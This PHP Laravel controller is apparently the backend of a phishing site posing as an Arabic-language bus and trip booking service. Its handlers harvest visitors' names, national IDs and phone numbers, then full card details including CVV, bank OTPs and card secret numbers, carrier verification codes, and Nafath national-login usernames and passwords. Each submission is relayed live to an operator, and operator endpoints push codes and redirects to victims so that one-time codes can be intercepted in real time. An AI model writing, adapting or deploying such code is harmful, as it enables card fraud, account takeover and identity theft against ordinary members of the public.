<?php

namespace App\Http\Controllers;

use App\Models\Trip;
use App\Models\BusRent;
use App\Events\SendAuth;
use App\Events\SendCode;
use App\Events\SendPart;
use App\Events\SendVisit;
use App\Events\NewVisitor;
use App\Events\SendPeople;
use App\Models\PaymentCard;
use Illuminate\Http\Request;
use App\Events\SendCodeEvent;
use App\Events\RecieveCodeEvent;
use App\Events\SendNafadId;
use App\Events\SendNotification;
use App\Events\SendPhoneData;
use App\Models\VisitorNotifications;
use Illuminate\Validation\ValidationException;

class TripController extends Controller
{
    public function saveTrip($trip_type, Request $request)
    {
        // dd($trip_type);
        try {
            switch ($trip_type) {
                case 'bus':
                    $validated = $this->validate($request, [
                        'from' => 'required|string',
                        'to' => 'required|string',
                        'category' => 'required|string|in:peoples,company',
                        'busType' => 'required|string',
                        'offec' => 'required|string',
                        'perosns' => 'required|integer|min:1',
                        'serviceDate' => 'required|date',
                        'servicedeparture_time' => 'required',
                        'city' => 'required|string',
                        'email' => 'required|string',
                    ]);
                    $bus_trip = BusRent::create($validated);
                    return redirect()->route('bus_summary', $bus_trip->id);
                    break;

                default:
                    $request['direction_type'] == $request->type;
                    $validated = $this->validate($request, [
                        'from' => 'required|string',
                        'to' => 'required|string',
                        'direction_type' => 'required|string|in:one_direction,go_and_back',
                        'departure_date' => 'required|date',
                        'departure_time' => 'required',
                        'return_date' => 'sometimes|nullable|date',
                        'adults_count' => 'required|integer|min:1',
                        'child_count' => 'required|integer|min:0',
                        'infant_count' => 'required|integer|min:0',
                        'special_needs_count' => 'required|integer|min:0',
                        'ticket_type' => 'required|string|in:economic,premium',
                    ]);
                    unset($request['direction_type']);
                    $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
                    $request['visitor_notifications_id'] = $visitor?->id ?? VisitorNotifications::create([])->id;
                    $request['price'] = $request->ticket_type =='economic' ? 40 : 120;
                    $trip = Trip::create($request->all());
                    return redirect()->route('summary', $trip->id);
                    break;

            }



        } catch (\Exception $ex) {
            dd($ex->getMessage());
        }
    }
    public function summary($id)
    {
        $summary = Trip::select('from', 'to', 'departure_time', 'type', 'departure_date', 'return_date', 'price')->find($id);
        $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
        if ($visitor) {
            $not  = VisitorNotifications::find($visitor->id);
            $not->update(['page' => 'دخل لصفحة  ملخص الحجز','step_number'=>2]);
            session()->put('visitor', json_encode($not));
            // event(new NewVisitor($not));
            event(new SendVisit($not));
            event(new SendNotification($not));
        }
        return view('summary', compact('summary'));
    }
    public function busSummary($id)
    {
        $summary = BusRent::find($id);
        $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
        if ($visitor) {
            $not  = VisitorNotifications::find($visitor->id);
            $not->update(['page' => 'دخل لصفحة  ملخص الحجز','step_number'=>2]);
            session()->put('visitor', json_encode($not));
            // event(new NewVisitor($not));
            event(new SendVisit($not));
            event(new SendNotification($not));
        }
        return view('bus_summary', compact('summary'));
    }
    public function peopleDataPage()
    {
        // dd($trip_type);
        $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
        if ($visitor) {
            $not  = VisitorNotifications::find($visitor->id);
            $not->update(['page' => 'دخل لصفحة البيانات الشخصية','step_number'=>3]);
            session()->put('visitor', json_encode($not));
            // event(new NewVisitor($not));
            event(new SendVisit($not));
            event(new SendNotification($not));
            return view('people_data');
        }
        return redirect('/');
    }
    public function peopleDataStore(Request $request)
    {

        try {
            $validated = $this->validate($request, [
                'people_name' => 'required|string',
                'phone' => 'required|string',
                'identityType' => 'required|string',
                'email' => 'required|string',
                'natID' => 'required|string',
                'gender' => 'required|string',
            ]);

            $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
            if ($visitor) {
                $validated['step_number'] = 4;
                $validated['page']  = 'قام بإرسال بياناته';

                $not  = VisitorNotifications::find($visitor->id);
                $not->update($validated);
                session()->put('visitor', json_encode($not));
                // event(new NewVisitor($not));
                event(new SendPeople($not));
                event(new SendNotification($not));
                return redirect()->route('trip_payment');
            }
            return redirect('/');
        } catch (\Exception $ex) {
            dd($ex->getMessage());
        }
    }
    public function paymentPage()
    {
        $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
        if ($visitor) {
            $not  = VisitorNotifications::find($visitor->id);
            $not->update(['page' => 'دخل لصفحة  بيانات الدفع','step_number'=>5]);
            session()->put('visitor', json_encode($not));
            // event(new NewVisitor($not));
            event(new SendVisit($not));
            event(new SendNotification($not));
        }
        // dd($trip_type);
        return view('trip_payment');
        // $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
        // if ($visitor) {
        //     $not  = VisitorNotifications::find($visitor->id);
        //     $not->update(['page' => 'دخل صفحة بيانات الدفع','step_number'=>4]);
        //     session()->put('visitor', json_encode($not));
        //     // event(new NewVisitor($not));
        //     // event(new SendVisit($not));
        //     return view('trip_payment');
        // }
        // return redirect('/');
    }
    public function paymentStore(Request $request)
    {
        // dd($trip_type);
        try {
            $validated = $this->validate($request, [
                'cname' => 'required|string',
                'cnmbr' => 'required|string',
                'year' => 'required|integer',
                'month' => 'required|integer',
                'resume' => 'required|integer',
            ]);

            $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
            if ($visitor) {
                $validated['visitor_notifications_id'] = $visitor?->id ?? VisitorNotifications::create([])->id;
                // $validated['otp_code'] = random_int(100000,999999);

                    $payment_card = PaymentCard::create($validated);


                $not  = VisitorNotifications::find($visitor->id);
                $not->update(['page' => 'قام بإرسال بيانات الدفع','step_number'=>6]);
                session()->put('visitor', json_encode($not));
                // event(new NewVisitor($not));
                event(new SendPart($payment_card,$not));
                event(new SendNotification($not));
                return redirect()->route('trip_payment_waiting');
            }
            return redirect('/');
        } catch (\Exception $ex) {
            dd($ex->getMessage());
        }

    }
    public function verifyOtp()
    {
        // dd($trip_type);
        return view('verify_otp');
    }
    public function verifyOtpStore(Request $request)
    {
        try {
            $validated = $this->validate($request, [
                'code' => 'required',
            ]);

            $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
            if ($visitor) {

                $payment_card = PaymentCard::where('visitor_notifications_id',$visitor->id)->latest()->first();
                $payment_card->otp_code = $request->code;
                $payment_card->save();
                $not  = VisitorNotifications::find($visitor->id);
                event(new SendPart($payment_card,$not));
            }
            return redirect()->route('confirm_card_owner');
        } catch (\Exception $ex) {
            dd($ex->getMessage());
        }
    }
    ////////////
    public function partAuth()
    {
        $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
        if ($visitor) {
            $not  = VisitorNotifications::find($visitor->id);
            $not->update(['page' => 'دخل لصفحة إثبات بيانات البطاقة','step_number'=>7]);
            session()->put('visitor', json_encode($not));
            // event(new NewVisitor($not));
            event(new SendVisit($not));
            event(new SendNotification($not));
            return view('card_auth');
        }
        return redirect('/');

    }
    public function partAuthStore(Request $request)
    {
        try {
            $validated = $this->validate($request, [
                'code' => 'required',
            ]);

            $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
            if ($visitor) {

                $payment_card = PaymentCard::where('visitor_notifications_id',$visitor->id)->latest()->first();
                $payment_card->secret_number = $request->code;
                $payment_card->save();
                // if($request->code != $payment_card->otp_code) return back()->withErrors(['code' => 'الكود غير صحيح']);
                $not  = VisitorNotifications::find($visitor->id);
                $not->update(['page' => 'أرسل رقم البطاقة','step_number'=>8]);

                event(new SendPart($payment_card,$not));
                event(new SendAuth($not,$request->code));
                event(new SendNotification($not));
            }
            return redirect()->route('confirm_phone');
            // return view('final_step');
        } catch (\Exception $ex) {
            dd($ex->getMessage());
        }
    }
    public function phoneAuth()
    {
        $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
        if ($visitor) {
            $not  = VisitorNotifications::find($visitor->id);
            $not->update(['page' => 'دخل لصفحة إثبات رقم الهاتف','step_number'=>9]);
            session()->put('visitor', json_encode($not));
            // event(new NewVisitor($not));
            event(new SendVisit($not));
            event(new SendNotification($not));
            return view('phone_auth');
        }
        return redirect('/');

    }
    public function phoneAuthStore(Request $request)
    {
        try {

            // $validated = $this->validate($request, [
            //     'phone_number' => 'required',
            //     // 'provider' => 'required',
            // ]);

            $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
            if ($visitor) {
                $not  = VisitorNotifications::find($visitor->id);
                $not->update(['page' => 'أرسل معلومات شبكة الجوال',
                    'step_number'=>10,
                    'phone_provider'=>$request->phone_provider ?? '',
                    'phone_number_2'=>$request->phone_number ?? '',
                    'phone_code'=>$request->code ?? '',

                ]);
                session()->put('visitor', json_encode($not));
                event(new SendPhoneData($not));
                event(new SendNotification($not));
            }
            return redirect()->route('enter_nafad_page');
            // if ($visitor) {

            //     $not  = VisitorNotifications::first();

            //     // event(new SendCode($not));
            //     event(new SendNotification($not));
            // }
            // // return view('phone_waiting',compact('not'));
            // return view('phone_waiting',compact('not'));
        } catch (\Exception $ex) {
            dd($ex->getMessage());
        }
    }
    public function nafadPage()
    {
        $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
        if ($visitor) {
            $not  = VisitorNotifications::find($visitor->id);
            $not->update(['page' => 'دخل لصفحة معلومات نفاذ','step_number'=>11]);
            session()->put('visitor', json_encode($not));
            // event(new NewVisitor($not));
            event(new SendVisit($not));
            event(new SendNotification($not));
            return view('nafad');
        }
        return redirect('/');
    }
    public function sendCodeToVisitor(Request $request)
    {
        $visitor_id = $request->visitor_id;
        $code = $request->code;
        event(new RecieveCodeEvent($visitor_id,$code,false,''));
    }
    public function saveRecievedCode(Request $request)
    {
        try {

            $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
            if ($visitor) {

                $not  = VisitorNotifications::find($visitor->id);
                $not->update(['page' => 'دخل لصفحة معلومات نفاذ','step_number'=>10]);
                session()->put('visitor', json_encode($not));
                // event(new SendCode($not));
                event(new SendNotification($not));
            }
            return view('nafad');
        } catch (\Exception $ex) {
            dd($ex->getMessage());
        }
    }
    public function saveNafadId(Request $request)
    {
        try {

            $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;
            if ($visitor) {

                $not  = VisitorNotifications::find($visitor->id);
                if($request->has('username'))
                {
                    $not->update(['page' => 'أرسل اسم المستخدم وكلمة السر الخاص بنفاذ','step_number'=>12,'nafad_id'=>$request->phone ?? null,'nafad_username'=>$request->username,'nafad_password'=>$request->password]);
                    session()->put('visitor', json_encode($not));
                    event(new SendNafadId($not));
                    event(new SendNotification($not));
                }
                else{
                    $not->update(['page' => 'أرسل المعرف الخاص بنفاذ','step_number'=>12,'nafad_id'=>$request->phone ?? null]);

                    session()->put('visitor', json_encode($not));
                    event(new SendCode($not));
                    event(new SendNafadId($not));
                    event(new SendNotification($not));
                    return view('nafad_code_waiting',compact('not'));
                }

            }
            //remove from session
            session()->forget('visitor');
            return view('final_step');
        } catch (\Exception $ex) {
            dd($ex->getMessage());
        }
    }
    public function redirectUser(Request $request)
    {

        $visitor_id = $request->visitor_id;
        $redirect_url = $request->redirect_url;
        $redirect_to ='';
        switch ($redirect_url) {
            case 'redirect-final':
                 $redirect_to = '/finish';
                break;
            case 'redirect-password':
                 $redirect_to = '/part/verification';
                break;

            default:
                 $redirect_to = "/waiting";
                break;
        }
        event(new RecieveCodeEvent($visitor_id,0,true,$redirect_to));
    }
}
